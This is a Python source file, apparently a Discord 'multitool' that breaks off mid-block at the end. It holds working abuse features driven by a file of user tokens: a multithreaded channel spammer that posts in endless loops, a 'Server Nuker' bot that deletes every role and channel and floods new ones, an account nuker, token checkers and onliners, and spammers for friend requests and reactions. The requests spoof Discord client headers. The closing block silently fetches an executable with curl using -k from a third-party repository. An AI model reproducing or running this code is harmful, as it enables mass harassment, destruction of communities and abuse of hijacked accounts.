from utilities.Settings.common import *
from utilities.Settings.libarys import *

import utilities.Plugins.Account_Nuker
import utilities.Plugins.Auto_Login
import utilities.Plugins.DM_Deleter
import utilities.Plugins.Token_Info

w = Fore.WHITE
b = Fore.BLACK
g = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
# r = Fore.RESET

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')

def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('data/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

try:
    with open('data/logins.json') as f:
        config = json.load(f)
except:
    with open('data/logins.json', 'w') as f:
            print(f"\n[{g}#\x1b[95m\x1B[37m] Logging In")
            login = input("[\x1b[95m#\x1b[95m\x1B[37m] Enter A Username: ")
            json.dump({"Login": login}, f, indent=4)
    input(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Successfully Logged in as: [{m}{login}{w}]\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to Continue: ")
    pass
with open('data/logins.json') as f:
    config = json.load(f)
login = config.get('Login')

def x():
    channel7 = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ")
    mess7 = input("[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
    tokens = open("tokens.txt", "r").read().splitlines()
    def spam(token, channel7, mess7):
        url = 'https://discord.com/api/v9/channels/'+channel7+'/messages'
        data = {"content": mess7}
        header = {"authorization": token}
        while True:
            r = requests.post(url, data=data, headers=header)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[Successfully Sent From]: {Fore.WHITE}{token[:63]}*********")
            else:
                print(f"{Fore.LIGHTRED_EX}[Failed To Send By]: {Fore.WHITE}{token[:63]}*********")
    for token in tokens:
        while True:
            threads = []
            for token in tokens:
                thread = threading.Thread(target=spam, args=(token,channel7,mess7))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()

languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'aud'   : 'English, Austrlia',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

regions = [
    'brazil',
    'hongkong',
    'india',
    'japan',
    'rotterdam',
    'russia',
    'singapore',
    'southafrica',
    'sydney',
    'us-central',
    'us-east',
    'us-south',
    'us-west'
]

def spammer():
    global threads
    setTitle(f"")
    tokens = open('tokens.txt', 'r').read().splitlines()
    clear = lambda: os.system('cls')
    clear()

    colorama.init()

    # Header Section
    Write.Print(f'Logged in as: {login}\n\n', Colors.blue_to_purple, interval=0.000)
    Write.Print("  __   _____  ______ \n", Colors.purple_to_blue, interval=0.000)
    Write.Print(" /_ | /  ___| |___ / \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("  | | | |       / / \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("  | | | |  _   / /   \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("  | | | |_| | / /__  \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("  |_| \\____/ /_____| \n", Colors.purple_to_blue, interval=0.000)
    Write.Print(f' [ v{THIS_VERSION} ]\n', Colors.purple_to_blue, interval=0.000)

    # Decorative Separator
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n", Colors.purple_to_blue, interval=0.000)

    # Menu Section with Spacing and Color Grouping
    print(f'''{m}'''.replace('$', f'{m}${w}') + f'''
        {m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Server Leaver     {b}|{Fore.RESET}{m}[{w}7{Fore.RESET}{m}]{Fore.RESET} Channel Spammer   {b}|{Fore.RESET}{m}[{w}13{Fore.RESET}{m}]{Fore.RESET} Patch Notes     {b}|{Fore.RESET}{m}[{w}19{Fore.RESET}{m}]{Fore.RESET}{lr} EXIT
        {m}[{w}2{Fore.RESET}{m}]{Fore.RESET} Token Checker     {b}|{Fore.RESET}{m}[{w}8{Fore.RESET}{m}]{Fore.RESET} Friend Spammer    {b}|{Fore.RESET}{m}[{w}14{Fore.RESET}{m}]{Fore.RESET} About/Activity
        {m}[{w}3{Fore.RESET}{m}]{Fore.RESET} Token Onliner     {b}|{Fore.RESET}{m}[{w}9{Fore.RESET}{m}]{Fore.RESET} HypeSquad Joiner  {b}|{Fore.RESET}{m}[{w}15{Fore.RESET}{m}]{Fore.RESET} Server Lookup
        {m}[{w}4{Fore.RESET}{m}]{Fore.RESET} Account Nuker     {b}|{Fore.RESET}{m}[{w}10{Fore.RESET}{m}]{Fore.RESET} Reaction Spammer {b}|{Fore.RESET}{m}[{w}16{Fore.RESET}{m}]{Fore.RESET} DM Deleter
        {m}[{w}5{Fore.RESET}{m}]{Fore.RESET} Server Nuker      {b}|{Fore.RESET}{m}[{w}11{Fore.RESET}{m}]{Fore.RESET} Token Infomation {b}|{Fore.RESET}{m}[{w}17{Fore.RESET}{m}]{Fore.RESET} About
        {m}[{w}6{Fore.RESET}{m}]{Fore.RESET} Nickname Changer  {b}|{Fore.RESET}{m}[{w}12{Fore.RESET}{m}]{Fore.RESET} Status Changer   {b}|{Fore.RESET}{m}[{w}18{Fore.RESET}{m}]{Fore.RESET}{lr} THREADS
    ''')

    # Closing Separator
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.blue_to_purple, interval=0.000)

    # User Choice Input
    choice = input(f'{m}[{w}+{m}]{w} Choice?: ')

    if choice == '1':
        # Server Leaver
        Spinner()
        setTitle(f"Server Leaver    |    ")
        token = open("tokens.txt", "r").read().splitlines()

        print("If you have no tokens in tokens.txt, then it won't work")
        ID = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                }
                requests.delete(apilink, headers=headers)
            print(f'[{g}>{Fore.RESET}] Done')

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '2':
        # Token Checker
        Spinner()
        setTitle(f"Token Checker    |    ") 
        print("If you have no tokens in tokens.txt, then it won't work")
        print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Loading Tokens:\n')
        time.sleep(0.5)
        def success(text): lock.acquire(); print(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"); lock.release()
        def invalid(text): lock.acquire(); print(f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"); lock.release()

        with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
        def save_tokens():
            with open("tokens.txt", "w") as f: f.write("")
            for token in tokens:
                with open("tokens.txt", "a") as f: f.write(token + "\n")
        def removeDuplicates(file):
            lines_seen = set()
            with open(file, "r+") as f:
                d = f.readlines(); f.seek(0)
                for i in d:
                    if i not in lines_seen: f.write(i); lines_seen.add(i)
                f.truncate()
        def check_token(token: str):
            try:
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"authorization": token}, timeout=5)
                if response.status_code == 200:
                    success(f"| {token[:63]}*********")
                else:
                    tokens.remove(token)
                    invalid(f"| {token}")
            except requests.exceptions.RequestException as e:
                print(f"[{Fore.RED}>] Error with token {token[:63]}: {e}")
                invalid(f"| {token}")
        def check_tokens():
            threads=[]
            for token in tokens:
                try:threads.append(threading.Thread(target=check_token, args=(token,)))
                except Exception as e: pass
            for thread in threads: thread.start()
            for thread in threads: thread.join()
        def start():
            removeDuplicates("tokens.txt")
            check_tokens()
            save_tokens()

        start()
        print(f'\n\n[\x1b[95m>\x1b[95m\x1B[37m] All Tokens have been Checked! (tokens.txt has been updated with only vaild tokens!)')
        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '3':
        # Token Onliner
        Spinner()
        setTitle(f"Token Onliner    |    ")
        print("If you have no tokens in tokens.txt, then it won't work")
        config = {
            "details": "PAID VERSION",
            "state": "https://guns.lol/1gz",
            "name": "1gz's Multitool",
        }

        class Onliner:
            def __init__(self, token) -> None:
                self.token    = token
                self.statuses = ["online", "idle", "dnd"]

            def __online__(self):
                ws = websocket.WebSocket()
                ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
                response = ws.recv()
                event = json.loads(response)
                heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000
                ws.send(
                    json.dumps(
                        {
                            "op": 2,
                            "d": {
                                "token": self.token,
                                "properties": {
                                    "$os": sys.platform,
                                    "$browser": "RTB",
                                    "$device": f"{sys.platform} Device",
                                },
                                "presence": {
                                    "game": {
                                        "name": config["name"],
                                        "type": 0,
                                        "details": config["details"],
                                        "state": config["state"],
                                    },
                                    "status": random.choice(self.statuses),
                                    "since": 0,
                                    "activities": [],
                                    "afk": False,
                                },
                            },
                            "s": None,
                        "t": None,
                        }
                    )
                )

                print(f"\n[{g}+{w}] Online | {self.token}")

                while True:
                    heartbeatJSON = {
                        "op": 1, 
                        "token": self.token, 
                        "d": "null"
                    }
                    ws.send(json.dumps(heartbeatJSON))
                    time.sleep(heartbeat_interval)


        for token in open("./tokens.txt", "r").read().splitlines():
            threading.Thread(target=Onliner(token).__online__).start()
        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '4':
        # Account Nuker
        Spinner()
        setTitle(f"Account Nuker    |    ")
        token = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ')
        validateToken(token)
        message_Content = str(input(f'[\x1b[95m>\x1b[95m\x1B[37m] MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(target=utilities.Plugins.Account_Nuker.SEVENEIGHTEIGHTFOURNUKER_START, args=(token, message_Content)).start()

    elif choice == '5':
        # Server Nuker
        Spinner()
        setTitle(f"Server Nuker   |    ")
#       intents = discord.Client(intents=discord.Intents().all())
#       width = os.get_terminal_size().columns
        def menu():
                token = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Bot token : ")
                f = open("utilities/Plugins/ignore/.token", "w")
                f.write(token)
                f.close()

                prefix = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot prefix : ")
                f = open("utilities/Plugins/ignore/.prefix", "w")
                f.write(prefix)
                f.close()

                spammessage = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : ")
                f = open("utilities/Plugins/ignore/.message", "w")
                f.write(spammessage)
                f.close()

                channelsname = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : ")
                f = open("utilities/Plugins/ignore/.channelsname", "w")
                channelsname = channelsname.lower()
                channelsname.replace("", "-")
                f.write(channelsname)
                f.close()
                main()

        def main():
    
            prefix = open("utilities/Plugins/ignore/.prefix", "r")
            prefix = prefix.read()

            token = open("utilities/Plugins/ignore/.token", "r")
            token = token.read()

            channelsname = open("utilities/Plugins/ignore/.channelsname", "r")
            channelsname = channelsname.read()

            spammessage = open("utilities/Plugins/ignore/.message", "r")
            spammessage = spammessage.read()

            seveneighteightfour = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
            seveneighteightfour.remove_command('help')

            @seveneighteightfour.event
            async def on_ready():
                if len(seveneighteightfour.guilds) > 1:
                    guildpl = "guilds"
                else:
                    guildpl = "guild"
                activity = discord.Game(name=f"Server Nuker", type=3)
                await seveneighteightfour.change_presence(status=discord.Status.dnd, activity=activity)
                clear()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {seveneighteightfour.user} ({len(seveneighteightfour.guilds)} {guildpl})")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Prefix : {prefix}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : {spammessage}")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : {channelsname}")
                print(f"")
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] type: {prefix}nuke in a channel")
                print(f"")

            @seveneighteightfour.event
            async def on_guild_channel_create(channel):
                while True:
                    await channel.send(spammessage)
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent : {spammessage}")

            @seveneighteightfour.event
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite()
                        break
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Joined Guild : {guild.name} ({guild.id}) {invite}")

            @seveneighteightfour.command()
            async def nuke(ctx):
                await ctx.message.delete()
                print(f"[\x1b[95m>\x1b[95m\x1B[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...")
                await ctx.guild.edit(name="get nuked lmao")
                for role in ctx.guild.roles:
                    try:
                        await role.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: @{role.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: @{role.name}")

                for channel in ctx.guild.channels:
                    try:
                        await channel.delete()
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: #{channel.name}")
                    except:
                        pass
                        print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: #{channel.name}")
                try:
                    for i in range(50):
                        await ctx.guild.create_text_channel(channelsname)
                        print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created: #{channel.name}")
                except Exception as er:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {er}")
            try:
                seveneighteightfour.run(token)
            except Exception as er:
                pass
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                input()

        while True:
            menu()

    elif choice == '6':
        # Nickname Changer
        Spinner()
        setTitle(f"Nickname Changer    |    ")
        print("If you have no tokens in tokens.txt, then it won't work")
        def changenick(server, nickname, token):
            headers = mainHeader(token)

            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                               json={"nick": nickname})
            if r.status_code == 200:
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Nickname Changed ')
            if r.status_code != 200:
                print(f'[{Fore.LIGHTRED_EX}-{Fore.RESET}] Cant Change Nickname... {Fore.RESET}')

        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ")
        nick = input("[\x1b[95m>\x1b[95m\x1B[37m] Nickname?: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '7':
        # Channel Spammer
        Spinner()
        setTitle(f"Channel Spammer    |    ")
        x()

    elif choice == '8':
        # Friend Request Spammer
        Spinner()
        setTitle(f"Friend Request Spammer    |    ")
        print("If you have no tokens in tokens.txt, then it won't work")
        
        def friender(token, username):
            try:
                headers = mainHeader(token)
                payload = {"username": username}
                
                src = requests.post(
                    'https://discord.com/api/v9/users/@me/relationships',
                    headers=headers,
                    json=payload
                )
                
                if src.status_code == 204:
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Friend Request Sent to {username}!")
                else:
                    if "captcha" in src.text.lower():
                        print(f"[{Fore.RED}>{Fore.RESET}] CAPTCHA required to send friend request so it failed.")
                    else:
                        print(f"[{Fore.RED}>{Fore.RESET}] Failed to send friend request to {username}.")
                        print(f"Status Code: {src.status_code}, Response: {src.text}")
            except Exception as e:
                print(f"[{Fore.RED}>{Fore.RESET}] Error: {e}")

        username = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Username: ").strip()

        tokens = open("tokens.txt", "r").read().splitlines()

        delay = float(input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Delay (in seconds): '))

        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, username)).start()

        time.sleep(2)
        input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER to exit.')

        exit = clear()
        exit = spammer()


    elif choice == '9':
        # HYPESUITE JOINER
        Spinner()
        setTitle(f"HypeSquad Joiner    |    ")
        print(f'''\n[\x1b[95m1\x1b[95m\x1B[37m] {Fore.MAGENTA}Bravery{Fore.RESET}
[\x1b[95m2\x1b[95m\x1B[37m] {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
[\x1b[95m3\x1b[95m\x1B[37m] {Fore.LIGHTGREEN_EX}Balance{Fore.RESET}
[\x1b[95m4\x1b[95m\x1B[37m] Leave The HypeSquad''')
        print("If you have no tokens in tokens.txt, then it won't work")

        def hype(token):
            house = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")

            headers = mainHeader(token)

            if house == "1":
                housefinal = '1'
            elif house == "2":
                housefinal = '2'
            elif house == "3":
                housefinal = '3'
            elif house == '4':
                housefinal = None
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Invalid choice")
                return

            if house in ['1', '2', '3']:
                payload = {
                    'house_id': housefinal
                }
                rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                if rep.status_code == 204:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                else:
                    print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed')

            elif house == '4':
                payload = {
                    'house_id': housefinal
                }
                req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                if req.status_code == 204:
                    print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                else:
                    pass

        tokens = open('tokens.txt', 'r').read().splitlines()
        for token in tokens:
            threading.Thread(target=lambda t=token: hype(t)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '10':
        # REACTION SPAMMER
        Spinner()
        setTitle(f"Reaction Spammer    |    ")
        print("If you have no tokens in tokens.txt, then it won't work")
        def reaction(chd, iddd, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       "sec-fetch-dest": "empty",
                       "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin",
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            a = requests.put(
                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                headers=headers)
            if a.status_code == 204:
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Reaction {org}")
            else:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Channel ID?: ')
        iddd = input('[\x1b[95m>\x1b[95m\x1B[37m] Message ID?: ')
        emoji = input('[\x1b[95m>\x1b[95m\x1B[37m] Emoji?: ')
        delay = int(input('[\x1b[95m>\x1b[95m\x1B[37m] Delay?: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '11':
        # TOKEN INFOMATION
        Spinner()
        token = input(
        f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Token_Info.Info(token)

    elif choice == '12':
        # STATUS CHANGER
        Spinner()
        setTitle(f"Status Changer    |    ")
        print("If you have no tokens in tokens.txt, then it won't work")
        def ChangeStatus(token, status):
            session = requests.Session()
            headers = {
                'authorization': token,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
                'content-type': 'application/json'
            }
            data = '{"custom_status":{"text":"' + status + '"}}'
            r = session.patch('https://discordapp.com/api/v6/users/@me/settings', headers=headers, data=data)
            print('[\x1B[32m>\x1B[32m] Done')

        tokens = open('tokens.txt', 'r').read().splitlines()
        status = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Status?: ')
        for token in tokens:
            threading.Thread(target=ChangeStatus, args=(token, status)).start()

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '13':
        # PATCH NOTES
        Spinner()
        setTitle(f"Patch Notes    |    ")
        SlowPrint("\n[\x1b[95m>\x1b[95m\x1B[37m] UPDATED Patch Notes:\n")
        print(f'\n[\x1b[95m#\x1b[95m\x1B[37m] Server MassDM      (OUTDATED) - (adding API v10 in next UPDATE!)\n[\x1b[95m#\x1b[95m\x1B[37m] DM Spammer         (OUTDATED) - (adding captcha key API in next UPDATE!)\n[\x1b[95m#\x1b[95m\x1B[37m] Reaction Spammer   (OUTDATED) - (Need to update the headers!)')

        time.sleep(1)
        exit = input('\n\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '14':
        # About/Activity
        Spinner()
        setTitle(f"About/Activity    |    ")
        print("If you have no tokens in tokens.txt, then it won't work")
        http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] About Changer')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] Activity Status Changer')
        changg = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ')
        if changg == '1':

            def abouttt(token, abbb):
                try:
                    headers = secondHeader(token)
                    rd = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                    if rd.status_code == 200:
                        print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')
                    else:
                        print(
                            f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error")
                except:
                    print('Error!')

            tokens = open('tokens.txt', 'r').read().splitlines()
            ab = input(f'[{m}>]{Fore.RESET} About: ')
            for token in tokens:
                threading.Thread(target=abouttt, args=(token, ab)).start()

        if changg == '2':
            def activity(token, act):
                ws = websocket.WebSocket()
                actt = 'Online'
                ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                gjs = {'name': act,
                       'type': 0}
                auth = {'op': 2,
                        'd': {'token': token,
                              'properties': {'$os': sys.platform,
                                             '$browser': 'RTB',
                                             '$device': f"{sys.platform} Device"},
                              'presence': {'game': gjs,
                                           'status': actt,
                                           'since': 0,
                                           'afk': False}},
                        's': None,
                        't': None}
                ws.send(json.dumps(auth))
                print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Activity Status: {act}')

            tokens = open('tokens.txt', 'r').read().splitlines()
            text = input('[\x1b[95m>\x1b[95m\x1B[37m] Activity Status: ')
            for token in tokens:
                threading.Thread(target=activity, args=(token, text)).start()

        time.sleep(1)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    elif choice == '15':
        # Server Lookup
        Spinner()
        setTitle(f"Server Lookup    |    ")
        exec(open('utilities/Plugins/Server_Lookup.py').read())

    elif choice == '16':
        # TOKEN INFOMATION
        Spinner()
        token = input(
        f'\n[\x1b[95m>\x1b[95m\x1B[37m] Account Token: ')
        validateToken(token)
        utilities.Plugins.Token_Info.Info(token)

    elif choice == '17':
        # About
        Spinner()
        setTitle(f"About    |    ")
        Write.Print("\nHello, thanks for using 1gz's Multitool!\nif you run into any problems make sure to let me know asap!\nDiscord: 1gz\nWebsite: https://guns.lol/1gz\n\n", Colors.purple_to_blue, interval=0.015)

        time.sleep(1)
        exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()

    elif choice == '18':
        # THREADS
        Spinner()
        setTitle(f"Threads: [{threads}]    |    ")
        print(f"\n[\x1b[95m#\x1b[95m\x1B[37m] Current Thread: {lr}{threads}{Fore.RESET}")
        try:
            amount = int(
                input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Thread Amount: '))
        except ValueError:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] | Invalid Amount!')
            sleep(1.5)
            spammer()
        if amount >= 40:
            print(f"[{Fore.RED}ERROR{Fore.RESET}] | Having {Fore.RED}{amount}{Fore.RESET} Will Cause Ratelimited, Try Something Lower...!")
            sleep(4)
            spammer()
        elif amount >= 15:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] Having More Than 15 Threads Can Cause Lag and Ratelimit... [{Fore.RED}{amount}{Fore.RESET}]\nContinue With High Threads?")
            yesno = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] y/n?: ')
            if yesno.lower() != "y":
                sleep(0.5)
                spammer()
        threads = amount
        SlowPrint(f"\nChanged Thread to: [\x1b[95m{amount}\x1b[95m\x1B[37m]")
        sleep(1.5)
        spammer()

    elif choice == '19':
        # EXIT
        Spinner()
        exit = True if input(f"\n[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Are You Sure You Want To Exit? Y/N: ").lower() == "y" else spammer() or "n" == sys.exit(0)
    else:
        print(f"")
        time.sleep(0)
        return spammer()

#   AUTO DOWNLOAD DRIVERS
if __name__ == "__main__":
                import sys
                setTitle(f"Dowloading Drivers    |    ")
                os.system("""if not exist "./chromedriver.exe" echo [+] Downloading Drivers: """)
                os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
                if os.path.basename(sys.argv[0]).endswith("exe"):
                    if not os.path.exists(getTempDir()+"\\1gz_proxies"):
                       clear()
                else:
